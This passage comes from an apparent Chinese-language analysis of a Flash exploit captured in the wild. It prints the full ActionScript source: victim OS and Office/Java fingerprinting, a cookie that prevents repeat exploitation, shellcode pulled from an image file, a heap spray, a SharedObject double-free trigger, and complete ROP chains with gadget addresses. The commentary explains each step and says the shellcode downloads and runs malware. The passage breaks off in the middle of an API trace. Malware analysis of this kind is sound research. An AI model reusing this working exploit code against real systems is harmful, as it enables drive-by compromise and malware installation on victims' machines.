      //                        //            var bytes:ByteArray = new ByteArray();            //            bytes.writeBytes(e.target.data as ByteArray,0,(e.target.data as ByteArray).length);            //            bytes.position=bytes.length-4;            //            //last four bytes is the length of shellcode            //            bytes.endian=&quot;littleEndian&quot;;            //            var len:uint=bytes.readUnsignedInt();            //            var shellbytes:ByteArray=new ByteArray();            //            shellbytes.writeBytes(bytes,bytes.length-4-len,len);            //            shellbytes.position=0;            //                        //            var shellcode:String=shellbytes.readMultiByte(shellbytes.length,&quot;iso-8859-1&quot;);                //            bgWorker.setSharedProperty(&quot;shellcode&quot;,shellcode);            //            bgWorker.start();                        var bytes:ByteArray = new ByteArray();            bytes.writeBytes(e.target.data as ByteArray,0,(e.target.data as ByteArray).length);            bytes.position=bytes.length-4;            //last four bytes is the length of shellcode            bytes.endian=&quot;littleEndian&quot;;            var len:uint=bytes.readUnsignedInt();            var shellbytes:ByteArray=new ByteArray();            shellbytes.writeBytes(bytes,bytes.length-4-len,len);            shellbytes.position=0;                        //var shellcode:String=shellbytes.readMultiByte(shellbytes.length,&quot;iso-8859-1&quot;);                //bgWorker.setSharedProperty(&quot;cc&quot;,shellcode);            bgWorker.setSharedProperty(&quot;cc&quot;,shellbytes);            bgWorker.start();        &#125;                public function versioncheck():int        &#123;            var os:String=Capabilities.os.toLowerCase();            var language:String=Capabilities.language.toLowerCase();            language.indexOf()            if(os==&quot;windows xp&quot;)            &#123;                if(language == &quot;zh-cn&quot;)                     return 1;                else if (language==&quot;en&quot;)                    return 2;                else if(language==&quot;zh-tw&quot;)                    return 3;                else                    return 0;            &#125;            else if(os==&quot;windows 7&quot;)            &#123;                ExternalInterface.call(&quot;eval&quot;,&quot;function checkversion()&#123;  var result;  var ua=window.navigator.userAgent.toLowerCase();  var temp=ua.replace(/ /g,\\&quot;\\&quot;);  &#123;    if(temp.indexOf(\\&quot;nt6.1\\&quot;)&gt;-1&amp;&amp;temp.indexOf(\\&quot;msie\\&quot;)&gt;-1&amp;&amp;temp.indexOf(\\&quot;msie10.0\\&quot;)==-1)    &#123;      var java6=0;      var java7=0;      var a=0;      var b=0;      try &#123;        java6=new ActiveXObject(\\&quot;JavaWebStart.isInstalled.1.6.0.0\\&quot;);       &#125; catch(e)&#123;&#125;      try &#123;        java7=new ActiveXObject(\\&quot;JavaWebStart.isInstalled.1.7.0.0\\&quot;);       &#125; catch(e)&#123;&#125;      if(java6&amp;&amp;!java7)      &#123;        return \\&quot;16\\&quot;;      &#125;      try &#123;        a=new ActiveXObject(\\&quot;SharePoint.OpenDocuments.4\\&quot;);      &#125; catch(e)&#123;&#125;      try &#123;        b=new ActiveXObject(\\&quot;SharePoint.OpenDocuments.3\\&quot;);      &#125; catch(e)&#123;&#125;            if((typeof a)==\\&quot;object\\&quot;&amp;&amp;(typeof b)==\\&quot;object\\&quot;)      &#123;        try &#123;          location.href = &#x27;ms-help://&#x27;        &#125;catch(e)&#123;&#125;;        return \\&quot;10\\&quot;;      &#125;      else if((typeof a)==\\&quot;number\\&quot;&amp;&amp;(typeof b)==\\&quot;object\\&quot;)      &#123;        try &#123;          location.href = &#x27;ms-help://&#x27;        &#125;catch(e)&#123;&#125;;        return \\&quot;07\\&quot;;      &#125;     &#125;   &#125;      return \\&quot;0\\&quot;;&#125;&quot;);                var version:String=ExternalInterface.call(&quot;eval&quot;,&quot;checkversion()&quot;);                trace(version);                var VerInt:Number = parseInt(version,10);                return VerInt;            &#125;            return 0;        &#125;                public function triggerexp():void        &#123;            var exp:String=&quot;AAAA&quot;;            //            while(exp.length&lt;1024*100)            //                exp=exp+exp;                        while(exp.length&lt;1024*100)            &#123;                exp=exp+((Math.random()&lt;&lt;16)+(Math.random()&gt;&gt;16)).toString();            &#125;            var sobj:SharedObject=SharedObject.getLocal(&quot;record&quot;);            sobj.data.logs=exp;        &#125;                public function getrop_XP():ByteArray        &#123;            // using msvcrt.dll to generate the rop chain             var baseaddr:int;            if(systemcase==1)                baseaddr=0x77be0000; //chinese            else if(systemcase==2)                baseaddr=0x77c10000; //english            else if(systemcase==3)                baseaddr=0x77be0000; //tradition            var rop:ByteArray=new ByteArray();            rop.endian=&quot;littleEndian&quot;;            rop.writeMultiByte(&quot;FILL&quot;,&quot;iso-8859-1&quot;);                             //rop.writeUnsignedInt(0xffffaaaa); // # RETN (ROP NOP) [msvcrt.dll]                        rop.writeUnsignedInt(0x77c39f92-0x77c10000+baseaddr); // # RETN (ROP NOP) [msvcrt.dll]            //rop.writeUnsignedInt(0x77bf18d3);                     // first call -&gt; # XCHG ESP,EAX # ROR [ESI-0x75],0xC1 # POP EBP # RETN 4 [msvcrt.dll]             rop.writeUnsignedInt(0x77c218d3-0x77c10000+baseaddr); // first call -&gt; # XCHG ESP,EAX # ROR [ESI-0x75],0xC1 # POP EBP # RETN 4 [msvcrt.dll]             rop.writeUnsignedInt(0x77c364d5-0x77c10000+baseaddr); // # POP EBP # RETN [msvcrt.dll]             rop.writeUnsignedInt(0x77c364d5-0x77c10000+baseaddr); // # skip 4 bytes [msvcrt.dll]                rop.writeUnsignedInt(0x77c46e91-0x77c10000+baseaddr); // # POP EBX # RETN [msvcrt.dll]             rop.writeUnsignedInt(0x00002201);                     // # 0x00000201-&gt; ebx            rop.writeUnsignedInt(0x77c4cbf9-0x77c10000+baseaddr); // # POP EDX # RETN [msvcrt.dll]             rop.writeUnsignedInt(0x00000040);                     // # 0x00000040-&gt; edx            rop.writeUnsignedInt(0x77c2c343-0x77c10000+baseaddr); // # POP ECX # RETN [msvcrt.dll]             rop.writeUnsignedInt(0x77c605b5-0x77c10000+baseaddr); // # &amp;Writable location [msvcrt.dll]            rop.writeUnsignedInt(0x77c23b47-0x77c10000+baseaddr); // # POP EDI # RETN [msvcrt.dll]             rop.writeUnsignedInt(0x77c39f92-0x77c10000+baseaddr); // # RETN (ROP NOP) [msvcrt.dll]            rop.writeUnsignedInt(0x77c34d9a-0x77c10000+baseaddr); // # POP ESI # RETN [msvcrt.dll]             rop.writeUnsignedInt(0x77c2aacc-0x77c10000+baseaddr); // # JMP [EAX] [msvcrt.dll]            rop.writeUnsignedInt(0x77c21d16-0x77c10000+baseaddr); // # POP EAX # RETN [msvcrt.dll]             rop.writeUnsignedInt(0x77c11131-0x77c10000+baseaddr); // # ptr to &amp;VirtualProtect() - 0xEF [IAT msvcrt.dll]                rop.writeUnsignedInt(0x77c567f0-0x77c10000+baseaddr); // # PUSHAD # ADD AL,0EF # RETN  [msvcrt.dll]              rop.writeUnsignedInt(0x77c51025-0x77c10000+baseaddr); // # ptr to &#x27;push esp #  ret &#x27; [msvcrt.dll]                        //set 0c0c0c0c to be executed                rop.writeUnsignedInt(0x0C0C08B8);            rop.writeUnsignedInt(0x04C0830C);            rop.writeUnsignedInt(0x90903881);            rop.writeUnsignedInt(0xF5749090);                        rop.writeByte(0x8B);            rop.writeByte(0xF0);            rop.writeByte(0xB8);            rop.writeUnsignedInt(0x77c11120-0x77c10000+baseaddr); // # ptr to &amp;VirtualProtect()            rop.writeByte(0x8B);            rop.writeByte(0x00);            rop.writeByte(0x68);            rop.writeUnsignedInt(0x77c605b5-0x77c10000+baseaddr); // # &amp;Writable location [msvcrt.dll]            rop.writeByte(0x6A);            rop.writeByte(0x40);                        //rop.writeUnsignedInt(0x08000068);            rop.writeUnsignedInt(0x00200068);            rop.writeUnsignedInt(0xD0FF5600);            rop.writeUnsignedInt(0x9090D6FF);                        for(var i=rop.length;i&lt;204;i++)            &#123;                rop.writeByte(0x90+(i+1)*3);                &#125;                        return rop;        &#125;                public function getrop_07():ByteArray        &#123;            // using hxds.dll to generate the rop chain             var rop:ByteArray=new ByteArray();            rop.endian=&quot;littleEndian&quot;;            rop.writeMultiByte(&quot;FILL&quot;,&quot;iso-8859-1&quot;);            rop.writeUnsignedInt(0x51c3f011); // 02&#x27;# RETN (ROP NOP) [hxds.dll]              rop.writeUnsignedInt(0x51c2cf1b); // first call --&gt; 01 # PUSH EAX # POP ESP # MOV EAX,ESI # POP ESI # RETN 0x04 [hxds.dll]                         rop.writeUnsignedInt(0x51be25dc); // 02 # POP EDI # RETN [hxds.dll]              rop.writeUnsignedInt(0x51bd1158); // 03 # ptr to &amp;VirtualProtect() [IAT hxds.dll]            rop.writeUnsignedInt(0x51c3098e); // 04 # MOV EAX,DWORD PTR DS:[EDI] # RETN [hxds.dll]            rop.writeUnsignedInt(0x51c39987); // 05 # XCHG EAX,ESI # RETN [hxds.dll]            rop.writeUnsignedInt(0x51bf1761); // 06 # POP EBP # RETN [hxds.dll]            rop.writeUnsignedInt(0x51c4b2df); // 07 # &amp; call esp [hxds.dll]            rop.writeUnsignedInt(0x51bf2e19); // 08 # POP EBX # RETN [hxds.dll]            rop.writeUnsignedInt(0x00002201); // 09 # 0x00000201-&gt; ebx            rop.writeUnsignedInt(0x51bfa969); // 10 # POP EDX # RETN [hxds.dll]            rop.writeUnsignedInt(0x00000040); // 11 # 0x00000040-&gt; edx            rop.writeUnsignedInt(0x51c385a2); // 12 # POP ECX # RETN [hxds.dll]            rop.writeUnsignedInt(0x51c5b991); // 13 # &amp;Writable location [hxds.dll]            rop.writeUnsignedInt(0x51bf7b52); // 14 # POP EDI # RETN [hxds.dll]            rop.writeUnsignedInt(0x51c3f011); // 15 # RETN (ROP NOP) [hxds.dll]            rop.writeUnsignedInt(0x51c433d7); // 16 # POP EAX # RETN [hxds.dll]            rop.writeUnsignedInt(0x90909090); // 17 # nop            rop.writeUnsignedInt(0x51c0a4ec); // 18 # PUSHAD # RETN [hxds.dll]                        // set the 0c0c0c0c to be excuted and jmp over to 0c0c0c0c                         rop.writeUnsignedInt(0x0C0C08B8);            rop.writeUnsignedInt(0x04C0830C);            rop.writeUnsignedInt(0x90903881);            rop.writeUnsignedInt(0xF5749090);            rop.writeUnsignedInt(0x58B8F08B);            rop.writeUnsignedInt(0x8B51BD11);            rop.writeUnsignedInt(0xB9916800);            rop.writeUnsignedInt(0x406A51C5);            //rop.writeUnsignedInt(0x08000068);            rop.writeUnsignedInt(0x00200068);            rop.writeUnsignedInt(0xD0FF5600);            rop.writeUnsignedInt(0x9090D6FF);                        for(var i=rop.length;i&lt;204;i++)            &#123;                rop.writeByte(0x90+(i+1)*3);                &#125;                        return rop;        &#125;                public function getrop_10():ByteArray        &#123;            // using hxds.dll to generate the rop chain             var rop:ByteArray=new ByteArray();            rop.endian=&quot;littleEndian&quot;;            rop.writeMultiByte(&quot;FILL&quot;,&quot;iso-8859-1&quot;);            rop.writeUnsignedInt(0x51c07402); // # RETN (ROP NOP) [hxds.dll]            rop.writeUnsignedInt(0x51c00e64); // first call--&gt; # XCHG EAX,ESP # ADD EAX,DWORD PTR DS:[EAX] # ADD ESP,10 # MOV EAX,ESI # POP ESI # POP EBP # RETN 0x04 [hxds.dll]            rop.writeUnsignedInt(0x51c07402); // # RETN (ROP NOP) [hxds.dll]            rop.writeUnsignedInt(0x51c07402); // # RETN (ROP NOP) [hxds.dll]            rop.writeUnsignedInt(0x51c07402); // # RETN (ROP NOP) [hxds.dll]            rop.writeUnsignedInt(0x51c07402); // # RETN (ROP NOP) [hxds.dll]            rop.writeUnsignedInt(0x51c07402); // # RETN (ROP NOP) [hxds.dll]                        rop.writeUnsignedInt(0x51bf34b4); // # POP ESI # RETN [hxds.dll]            rop.writeUnsignedInt(0x51bd10b8); // # ptr to &amp;VirtualProtect() [IAT hxds.dll]            rop.writeUnsignedInt(0x51bd2d97); // # MOV EAX,DWORD PTR DS:[ESI] # RETN [hxds.dll]            rop.writeUnsignedInt(0x51bdcba0); // # XCHG EAX,ESI # RETN 00 [hxds.dll]            rop.writeUnsignedInt(0x51c379e2); // # POP EBP # RETN [hxds.dll]            rop.writeUnsignedInt(0x51c59683); // # &amp; call esp [hxds.dll]            rop.writeUnsignedInt(0x51be198c); // # POP EBX # RETN [hxds.dll]            rop.writeUnsignedInt(0x00002201); // # 0x00000201-&gt; ebx            rop.writeUnsignedInt(0x51c35ac3); // # POP EDX # RETN [hxds.dll]            rop.writeUnsignedInt(0x00000040); // # 0x00000040-&gt; edx            rop.writeUnsignedInt(0x51becf3e); // # POP ECX # RETN [hxds.dll]            rop.writeUnsignedInt(0x51c5d150); // # &amp;Writable location [hxds.dll]            rop.writeUnsignedInt(0x51bef563); // # POP EDI # RETN [hxds.dll]            rop.writeUnsignedInt(0x51c07402); // # RETN (ROP NOP) [hxds.dll]            rop.writeUnsignedInt(0x51c56fbd); // # POP EAX # RETN [hxds.dll]            rop.writeUnsignedInt(0x90909090); // # nop            rop.writeUnsignedInt(0x51c3604e); // # PUSHAD # RETN [hxds.dll]                        // set the 0c0c0c0c to be excuted and jmp over to 0c0c0c0c             rop.writeUnsignedInt(0x0C0C08B8);            rop.writeUnsignedInt(0x04C0830C);            rop.writeUnsignedInt(0x90903881);            rop.writeUnsignedInt(0xF5749090);            rop.writeUnsignedInt(0xB8B8F08B);            rop.writeUnsignedInt(0x8B51BD10);            rop.writeUnsignedInt(0xD1506800);            rop.writeUnsignedInt(0x406A51C5);            //rop.writeUnsignedInt(0x08000068);            rop.writeUnsignedInt(0x00200068);            rop.writeUnsignedInt(0xD0FF5600);            rop.writeUnsignedInt(0x9090D6FF);                        for(var i=rop.length;i&lt;204;i++)            &#123;                rop.writeByte(0x90+(i+1)*3);                &#125;                        return rop;        &#125;                public function getrop_16():ByteArray        &#123;            // using hxds.dll to generate the rop chain             var rop:ByteArray=new ByteArray();            rop.endian=&quot;littleEndian&quot;;            rop.writeMultiByte(&quot;FILL&quot;,&quot;iso-8859-1&quot;);                        rop.writeUnsignedInt(0xaaaaaaaa); // 0x19921231                        rop.writeUnsignedInt(0x7C347F67); // eip   xchg eax,esp # ret                        rop.writeUnsignedInt(0x7c37653d); // POP EBP // RETN            rop.writeUnsignedInt(0xfffffdff); // // skip 4 bytes            rop.writeUnsignedInt(0x7c347f98); // POP EBX // RETN            rop.writeUnsignedInt(0x7c3415a2); // 0x000000c8-&gt; ebx (size 200 bytes) *            rop.writeUnsignedInt(0xffffffff); // POP EDX // RETN            rop.writeUnsignedInt(0x7c376402); // 0x00000040-&gt; edx            rop.writeUnsignedInt(0x7c351e05); // POP ECX // RETN            rop.writeUnsignedInt(0x7c345255); // &amp;Writable location            rop.writeUnsignedInt(0x7c352174); // POP EDI // RETN            rop.writeUnsignedInt(0x7c344f87); // RETN (ROP NOP)            rop.writeUnsignedInt(0xffffffc0); // POP ESI // RETN            rop.writeUnsignedInt(0x7c351eb1); // JMP [EAX]            rop.writeUnsignedInt(0x7c34d201); // POP EAX // RETN            rop.writeUnsignedInt(0x7c38b001); // ptr to &amp;VirtualProtect() - 0x0EF  *            rop.writeUnsignedInt(0x7c347f97); // PUSHAD // ADD AL,0EF // RETN            rop.writeUnsignedInt(0x7c37a151); // ptr to &#x27;push esp #  ret &#x27;                        rop.writeUnsignedInt(0x7c378c81); // 0x19921231            rop.writeUnsignedInt(0x7c345c30); // 0x19921231            rop.writeUnsignedInt(0x90909090); // 0x19921231                        // set the 0c0c0c0c to be excuted and jmp over to 0c0c0c0c                 rop.writeUnsignedInt(0x37A140B8);            rop.writeUnsignedInt(0x68008B7C);            rop.writeUnsignedInt(0x7C38B750);            rop.writeUnsignedInt(0x0068406A);            rop.writeUnsignedInt(0x68000020);            rop.writeUnsignedInt(0x0C0C0C0C);            rop.writeUnsignedInt(0x0CB8D0FF);            rop.writeUnsignedInt(0xFF0C0C0C);            rop.writeUnsignedInt(0x909090D0);                        for(var i=rop.length;i&lt;204;i++)            &#123;                rop.writeByte(0x90+(i+1)*3);                &#125;                        return rop;        &#125;                public static function init_pool(val)        &#123;            pool = new ByteArray  ;            pool.writeBytes(val);            while (pool.length &lt; POOL_SIZE)            &#123;                var temp:ByteArray = new ByteArray  ;                temp.writeBytes(pool);                pool.writeBytes(temp);            &#125;                    &#125;        public static function alloc(val,size)        &#123;            if ((null == allocs))            &#123;                allocs = new Array  ;            &#125;            dstSize = size;            init_pool(val);        &#125;                public static function free()        &#123;            allocs = null;        &#125;                public function cido()        &#123;            ExternalInterface.call(&quot;eval&quot;, &#x27;function setcookie()&#123;var Then = new Date(); Then.setTime(Then.getTime() + 1000 * 3600 * 24 * 7 );document.cookie = &quot;Cookie1=CC20131221; expires=&quot;+ Then.toGMTString();&#125;function canIdo()&#123;var cookieString = new String(document.cookie);if(cookieString.indexOf(&quot;CC20131221&quot;) == -1)&#123;setcookie(); return 1;&#125;else&#123; return 0;&#125;&#125;&#x27;);            var ret:String = ExternalInterface.call(&quot;eval&quot;, &quot;canIdo()&quot;);            return (parseInt(ret, 10));        &#125;                public function cc()        &#123;                        if (Worker.current.isPrimordial)            &#123;                // check cookie                if (cido()==0)                    return;                                systemcase=versioncheck();                if(systemcase==0)                     return;                    //readout the shellcode from the picture                var loader:URLLoader=new URLLoader();                loader.dataFormat=URLLoaderDataFormat.BINARY;                loader.addEventListener(Event.COMPLETE,onComplete);                loader.load(new URLRequest(&quot;logo.gif&quot;));                                bgWorker = WorkerDomain.current.createWorker(loaderInfo.bytes);                    bgWorker.setSharedProperty(&quot;version&quot;,systemcase);            &#125;            else            &#123;                systemcase=Worker.current.getSharedProperty(&quot;version&quot;);                //var shellcode:String=Worker.current.getSharedProperty(&quot;cc&quot;);                var shellbytes:ByteArray=Worker.current.getSharedProperty(&quot;cc&quot;);                                var val:ByteArray = new ByteArray();                val.endian = Endian.LITTLE_ENDIAN;                var i, j, sc_len:uint = 0;                                                  for (i = 0; i&lt; (0x0c0c); i++)                &#123;                    val.writeByte(0x90+i);                                    &#125;                                 // 这个for循环用来转换下面这两句                //sc = cc_shellcode;                //val.writeBytes(hexToBin(sc));                /*for (i = 0; i &lt; shellcode.length; i++)                &#123;                val.writeByte(shellcode.charCodeAt(i));                &#125;*/                val.writeBytes(shellbytes);                                for (i = val.length; i&lt; 0x10000; i++)                &#123;                    val.writeByte(0x90+i);                &#125;                alloc(val, 0x100000-0x24);                var block1:ByteArray = new ByteArray();                block1.writeBytes(pool, 0, 0x100000-0x24);                //block1.writeBytes(val, 0, 0x100000-0x24);                allocs.push(block1);                pool = null;                for(var i=0;i&lt;0xe0;i++)                &#123;                    var block:ByteArray = new ByteArray();                    block.writeBytes(block1, 0, 0x100000-0x24);                    allocs.push(block);                &#125;                                triggerexp();                var rop:ByteArray;                if(systemcase==7) //office2007 + win7                &#123;                    rop=getrop_07();                    rop.toString();                &#125;                else if(systemcase==10) //office2010 + win7                &#123;                    rop=getrop_10();                    rop.toString();                &#125;                else if(systemcase==16) //java1.6 + win7                &#123;                    rop=getrop_16();                    rop.toString();                &#125;                else if(systemcase==1 || systemcase==2 || systemcase==3) //XP + Chinese || English || Tradition                &#123;                    rop=getrop_XP();                    rop.toString();                &#125;                Worker.current.terminate();            &#125;        &#125;    &#125;&#125;\n\n该 exp 包含了针对不同运行时环境的不同利用函数和若干辅助函数，可先从理解辅助函数功能开始理解，最后自底向上拼凑出主函数的实际执行流\nScriptpublic function versioncheck():int        &#123;            var os:String=Capabilities.os.toLowerCase();            var language:String=Capabilities.language.toLowerCase();            language.indexOf()            if(os==&quot;windows xp&quot;)            &#123;                if(language == &quot;zh-cn&quot;)                     return 1;                else if (language==&quot;en&quot;)                    return 2;                else if(language==&quot;zh-tw&quot;)                    return 3;                else                    return 0;            &#125;            else if(os==&quot;windows 7&quot;)            &#123;                ExternalInterface.call(&quot;eval&quot;,&quot;function checkversion()&#123;  var result;  var ua=window.navigator.userAgent.toLowerCase();  var temp=ua.replace(/ /g,\\&quot;\\&quot;);  &#123;    if(temp.indexOf(\\&quot;nt6.1\\&quot;)&gt;-1&amp;&amp;temp.indexOf(\\&quot;msie\\&quot;)&gt;-1&amp;&amp;temp.indexOf(\\&quot;msie10.0\\&quot;)==-1)    &#123;      var java6=0;      var java7=0;      var a=0;      var b=0;      try &#123;        java6=new ActiveXObject(\\&quot;JavaWebStart.isInstalled.1.6.0.0\\&quot;);       &#125; catch(e)&#123;&#125;      try &#123;        java7=new ActiveXObject(\\&quot;JavaWebStart.isInstalled.1.7.0.0\\&quot;);       &#125; catch(e)&#123;&#125;      if(java6&amp;&amp;!java7)      &#123;        return \\&quot;16\\&quot;;      &#125;      try &#123;        a=new ActiveXObject(\\&quot;SharePoint.OpenDocuments.4\\&quot;);      &#125; catch(e)&#123;&#125;      try &#123;        b=new ActiveXObject(\\&quot;SharePoint.OpenDocuments.3\\&quot;);      &#125; catch(e)&#123;&#125;            if((typeof a)==\\&quot;object\\&quot;&amp;&amp;(typeof b)==\\&quot;object\\&quot;)      &#123;        try &#123;          location.href = &#x27;ms-help://&#x27;        &#125;catch(e)&#123;&#125;;        return \\&quot;10\\&quot;;      &#125;      else if((typeof a)==\\&quot;number\\&quot;&amp;&amp;(typeof b)==\\&quot;object\\&quot;)      &#123;        try &#123;          location.href = &#x27;ms-help://&#x27;        &#125;catch(e)&#123;&#125;;        return \\&quot;07\\&quot;;      &#125;     &#125;   &#125;      return \\&quot;0\\&quot;;&#125;&quot;);                var version:String=ExternalInterface.call(&quot;eval&quot;,&quot;checkversion()&quot;);                trace(version);                var VerInt:Number = parseInt(version,10);                return VerInt;            &#125;            return 0;        &#125;\n\nversioncheck 函数将会探测受害者机器上运行的操作系统，若是 XP 系统则根据系统语言返回相应的返回值，若是 Windows 7 则执行 checkversion 函数检测受害者的浏览器版本，是否安装了 Java 1.6，是否安装了 Office 2010 或 2007，并返回相应情况下的返回值\nScriptpublic function getrop_XP():ByteArraypublic function getrop_07():ByteArraypublic function getrop_10():ByteArraypublic function getrop_16():ByteArray\n\n结合 versioncheck 函数内的返回情况可以推断出这几个函数是在生成相应平台的 ROP 链\nScriptvar bgWorker:Worker;public function onComplete(e:Event):void&#123;    //                //            var bytes:ByteArray = new ByteArray();    //            bytes.writeBytes(e.target.data as ByteArray,0,(e.target.data as ByteArray).length);    //            bytes.position=bytes.length-4;    //            //last four bytes is the length of shellcode    //            bytes.endian=&quot;littleEndian&quot;;    //            var len:uint=bytes.readUnsignedInt();    //            var shellbytes:ByteArray=new ByteArray();    //            shellbytes.writeBytes(bytes,bytes.length-4-len,len);    //            shellbytes.position=0;    //                //            var shellcode:String=shellbytes.readMultiByte(shellbytes.length,&quot;iso-8859-1&quot;);        //            bgWorker.setSharedProperty(&quot;shellcode&quot;,shellcode);    //            bgWorker.start();        var bytes:ByteArray = new ByteArray();    bytes.writeBytes(e.target.data as ByteArray,0,(e.target.data as ByteArray).length);    bytes.position=bytes.length-4;    //last four bytes is the length of shellcode    bytes.endian=&quot;littleEndian&quot;;    var len:uint=bytes.readUnsignedInt();    var shellbytes:ByteArray=new ByteArray();    shellbytes.writeBytes(bytes,bytes.length-4-len,len);    shellbytes.position=0;        //var shellcode:String=shellbytes.readMultiByte(shellbytes.length,&quot;iso-8859-1&quot;);        //bgWorker.setSharedProperty(&quot;cc&quot;,shellcode);    bgWorker.setSharedProperty(&quot;cc&quot;,shellbytes);    bgWorker.start();&#125;\n\n这是一个事件监听函数，将会从监听事件中以小端字节序读取相应数据（实际上读取的是图片马的数据）。其中读取的最后四个字节的值为偏移量（实际上是 shellcode 的长度），使用读取的数据的长度减去作为偏移量的四个字节的长度与其表示的偏移量得到一个内部嵌入的数据（shellcode）的起始地址，读取并保存到共享变量 cc 中\nScriptpublic function cido()&#123;    ExternalInterface.call(&quot;eval&quot;, &#x27;function setcookie()&#123;var Then = new Date(); Then.setTime(Then.getTime() + 1000 * 3600 * 24 * 7 );document.cookie = &quot;Cookie1=CC20131221; expires=&quot;+ Then.toGMTString();&#125;function canIdo()&#123;var cookieString = new String(document.cookie);if(cookieString.indexOf(&quot;CC20131221&quot;) == -1)&#123;setcookie(); return 1;&#125;else&#123; return 0;&#125;&#125;&#x27;);    var ret:String = ExternalInterface.call(&quot;eval&quot;, &quot;canIdo()&quot;);    return (parseInt(ret, 10));&#125;\n\n这看上去是一个设置 Cookie 的函数，Cookie 有效期为 1000 周，疑似用于避免进行同一目标的重复漏洞\nScriptstatic const POOL_SIZE:int = 0x100000;static var allocs:Array;static var pool:ByteArray;static var dstSize:int;static var allocCount:int;public static function init_pool(val)&#123;    pool = new ByteArray  ;    pool.writeBytes(val);    while (pool.length &lt; POOL_SIZE)    &#123;        var temp:ByteArray = new ByteArray  ;        temp.writeBytes(pool);        pool.writeBytes(temp);    &#125;    &#125;public static function alloc(val,size)&#123;    if ((null == allocs))    &#123;        allocs = new Array  ;    &#125;    dstSize = size;    init_pool(val);&#125;public static function free()&#123;    allocs = null;&#125;\n\n这三个，或者起码前两个函数需要连在一起看（free 函数没被调用）。init_pool 函数成倍扩大数组到指定大小的行为很明显是在 Heap Spray\nScriptpublic function triggerexp():void&#123;    var exp:String=&quot;AAAA&quot;;    //            while(exp.length&lt;1024*100)    //                exp=exp+exp;        while(exp.length&lt;1024*100)    &#123;        exp=exp+((Math.random()&lt;&lt;16)+(Math.random()&gt;&gt;16)).toString();    &#125;    var sobj:SharedObject=SharedObject.getLocal(&quot;record&quot;);    sobj.data.logs=exp;&#125;\n\n这个函数看上去是在为 exp 填充 padding 字符串，然后把 exp 塞到创建的共享对象 record 的属性值中，注意这一行为开启 Pending Fush 标志\nScriptvar bgWorker:Worker;var systemcase:int;//public var cc_shellcode:String = &quot;19921231dbd7d97424f4b879c464b733c9b1385d83c504314513033cd78642423fcfadbac0b0245ff1e25314a032177849b87568dacc519f6b7a84ae6c4a087caeccf47ee32ec4b1f62f01aff962daa4a8926ff87092bf77c8ecba47bd46c4976edc8e0f04ba2e2ec9d81379662ae778ae62084b8e29376403337f42fc468bb1815048c85dd44d6a154eb68bfa093d87b75e198b46b211b7c335f63e9711d21b433b43c1224493ad9be0df5fcf93bd350e11b8701029c3d2791848bdfea59bfaf1ef86aa99a952efc7498933fec938cb05d148ce4255a0a2db30c611db10a5af7fcc43a11b9de44eb83272c334d0e910874691378b157bd22bbf83&quot;;public var sc:String = new String();static const POOL_SIZE:int = 0x100000;static var allocs:Array;static var pool:ByteArray;static var dstSize:int;static var allocCount:int;public function cc()&#123;                if (Worker.current.isPrimordial)    &#123;        // check cookie        if (cido()==0)            return;                systemcase=versioncheck();        if(systemcase==0)             return;            //readout the shellcode from the picture        var loader:URLLoader=new URLLoader();        loader.dataFormat=URLLoaderDataFormat.BINARY;        loader.addEventListener(Event.COMPLETE,onComplete);        loader.load(new URLRequest(&quot;logo.gif&quot;));                bgWorker = WorkerDomain.current.createWorker(loaderInfo.bytes);            bgWorker.setSharedProperty(&quot;version&quot;,systemcase);    &#125;    else    &#123;        systemcase=Worker.current.getSharedProperty(&quot;version&quot;);        //var shellcode:String=Worker.current.getSharedProperty(&quot;cc&quot;);        var shellbytes:ByteArray=Worker.current.getSharedProperty(&quot;cc&quot;);                var val:ByteArray = new ByteArray();        val.endian = Endian.LITTLE_ENDIAN;        var i, j, sc_len:uint = 0;                                  for (i = 0; i&lt; (0x0c0c); i++)        &#123;            val.writeByte(0x90+i);        &#125;                 // 这个for循环用来转换下面这两句        //sc = cc_shellcode;        //val.writeBytes(hexToBin(sc));        /*for (i = 0; i &lt; shellcode.length; i++)        &#123;        val.writeByte(shellcode.charCodeAt(i));        &#125;*/        val.writeBytes(shellbytes);                for (i = val.length; i&lt; 0x10000; i++)        &#123;            val.writeByte(0x90+i);        &#125;        alloc(val, 0x100000-0x24);        var block1:ByteArray = new ByteArray();        block1.writeBytes(pool, 0, 0x100000-0x24);        //block1.writeBytes(val, 0, 0x100000-0x24);        allocs.push(block1);        pool = null;        for(var i=0;i&lt;0xe0;i++)        &#123;            var block:ByteArray = new ByteArray();            block.writeBytes(block1, 0, 0x100000-0x24);            allocs.push(block);        &#125;                triggerexp();        var rop:ByteArray;        if(systemcase==7) //office2007 + win7        &#123;            rop=getrop_07();            rop.toString();        &#125;        else if(systemcase==10) //office2010 + win7        &#123;            rop=getrop_10();            rop.toString();        &#125;        else if(systemcase==16) //java1.6 + win7        &#123;            rop=getrop_16();            rop.toString();        &#125;        else if(systemcase==1 || systemcase==2 || systemcase==3) //XP + Chinese || English || Tradition        &#123;            rop=getrop_XP();            rop.toString();        &#125;        Worker.current.terminate(); //* Vulnerability    &#125;&#125;\n\n漏洞利用的主要逻辑是在 cc 函数中完成的，它将首先检查 Cookie 值是否设置，若已设置则不再重复进行漏洞利用。随后检查受害者的系统环境，只有 xp 系统且系统语言为中文或英文，或 win7 系统的用户为漏洞利用的攻击目标。随后执行事件监听函数，加载图片马并创建 background worker\nBackground worker 会加载事件监听函数里构造的 shellcode，随后堆喷布局堆空间，再构造触发漏洞所需的共享对象 record，根据系统环境构造 ROP 链，最终终止 Background Worker 并清除共享对象\nPrimordial Worker 也会随之结束，对共享对象进行 flush 并调用 Exit 函数进行析构，而在执行释放操作前，Primordial Worker 会注意到共享对象的引用计数为 0，异步触发垃圾回收。而垃圾回收将会再发起一次 flush 操作，并再次执行 Exit 函数。由于共享对象大小大于 Maximum Storage 100KB，正常流程的 flush 会通过第一道检查而在第二道检查处失败并释放对象块，而这一失败会使得 Pending Flush 标志位仍处于开启状态，因此垃圾回收操作流重入发起的 flush 操作也将通过第一道检查，并再次进行对象块的释放，最终造成 double free 漏洞，堆结构被破坏，进而泄露虚表指针等重要信息与发生控制流劫持，程序将跳转到 ROP 链上执行 shellcode。图片马中的 shellcode 将会利用以下函数下载并执行恶意程序\n LoadLibraryA(wininet) LoadLibraryA(user32) VirtualProtect(adr=404bf1, sz=4,flags=40) SetUnhandledExceptionFilter(0) VirtualProtect(adr=7c81cdda, sz=82,flags=40) VirtualProtect(adr=7c81cdda, sz=82,flags=0) SetUnhandledExceptionFilter(7c81cdda) GetTempPath(len=104, buf=12fca4) = 14GetTempFileName(path=C:\\users\\jaime\\Temp\\, 